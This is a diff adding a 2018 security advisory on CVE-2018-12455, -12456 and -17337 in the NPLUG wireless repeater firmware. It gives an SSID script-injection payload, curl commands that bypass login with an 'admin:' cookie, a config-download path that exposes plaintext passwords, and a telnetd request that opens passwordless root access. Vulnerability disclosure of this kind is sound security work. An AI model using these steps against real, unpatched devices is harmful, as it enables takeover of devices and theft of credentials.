@@ -1,0 +1,122 @@
+id: 31293
+date: 10/10/2018
+title: NPLUG Wireless Repeater 1.0.0.14 CSRF / XSS / Authentication Bypass Vulnerabilities
+author: Patrick Costa
+cves: CVE-2018-12455, CVE-2018-12456, CVE-2018-17337
+
+=====[ Tempest Security Intelligence ]=====================================
+
+
+  Multiple vulnerabilities in NPLUG wireless repeater
+
+  CVE-2018-12455: Authentication bypass
+  CVE-2018-12456: Multiple CSRF
+  CVE-2018-17337: XSS via SSID
+
+  -------------------------------------------------------
+  Author:
+    - Patrick Costa < @patrickrbc >
+    Tempest Security Intelligence - Recife, PE - Brazil
+
+
+=====[ Table of Contents ]=================================================
+
+  1. Overview
+  2. Detailed description  
+  3. Affected versions & Solutions  
+  4. Timeline of disclosure  
+  5. Thanks & Acknowledgements
+  6. References
+
+=====[ Overview ]==========================================================
+ 
+  * System affected : NPLUG wireless repeater [1]
+  * Version         : 1.0.0.14
+  * Impact          : An attacker can get root access on the device.
+
+=====[ Detailed description ]==============================================
+
+  DISCLAIMER: This device uses a modified Tenda firmware [2]. Most of the
+  vulnerabilities disclosed here were previously published regarding other
+  similar device, besides that this device is pretty old.
+
+  NPLUG wireless repeater has multiple vulnerabilities that can be combined
+  to get a root access on the device.
+
+  The first thing you can do to obtain access to the device is to exploit a
+  XSS in the web interface (CVE-2018-17337). This can be exercised by
+placing
+  an access point in an appropriate range from the device with a malicious
+  SSID, e.g.:
+
+    <script src="[pwned]"></script>
+
+  If the user tries to scan for wireless networks using the web
+interface the
+  XSS will pop and you're done. You can do all the stuff that will be
+described
+  here.
+
+  But, what if the user never uses this feature? Well, NPLUG's web interface
+  has no CSRF (CVE-2018-12456) protection, so you can try to force a
+connected
+  user to activate WAN access or change wireless security settings.
+
+  Once you're inside NPLUG's network things became really easy. You can
+bypass
+  the authentication just by setting a cookie named "admin:"
+(CVE-2018-12455).
+ 
+  Example:
+
+      curl -I http://10.0.0.1/
+      HTTP/1.0 302 Redirect
+      ...
+
+      curl -I http://10.0.0.1/ -H "Cookie: admin:="
+      HTTP/1.0 200 OK
+      ...
+ 
+
+  Now you have access to all the web interface features and you can download
+  the config at http://10.0.0.1/DownloadCfg/RouterCfm.cfg containig
+passwords
+  in plain text.
+ 
+  If that is not enough for you, you can activate telnet daemon by making a
+  simple GET request to /goform/telnetd and guess what! Root access with no
+  password.
+
+  Lately, I found out that this firmware had a binary that would work as the
+  same backdoor previously reported for Tenda routers [3]. However, the
+service
+  is not started by default and even when manually starting it, I couldn't
+  exploit it for some reason. But there is not much need to do so.
+
+
+=====[ Affected versions & Solutions ]=====================================
+
+  This test was performed against version 1.0.0.14 but previous versions are
+  probably vulnerable.
+
+=====[ Timeline of disclosure ]============================================
+
+  15/06/2018 - Vendor contacted.
+  04/07/2018 - Vendor requested time to verify.
+  22/08/2018 - Vendor replied they won't patch it.
+
+=====[ Thanks & Acknowledgements ]=========================================
+
+  - Felipe Xavier < filipe.xavier () tempest.com.br >
+  - Gustavo Pimentel < gustavo.pimentel () tempest.com.br>
+  - Tempest Security Intelligence [4]
+
+=====[ References ]========================================================
+
+  [1]
+http://www.intelbras.com.br/empresarial/wi-fi/para-sua-casa/repetidor-de-sinal/nplug
+  [2] http://www.tendacn.com/en/default.html
+  [3] http://www.devttys0.com/2013/10/from-china-with-love/
+  [4] http://www.tempest.com.br/
+
+#  0day.today [2023-03-26]  #
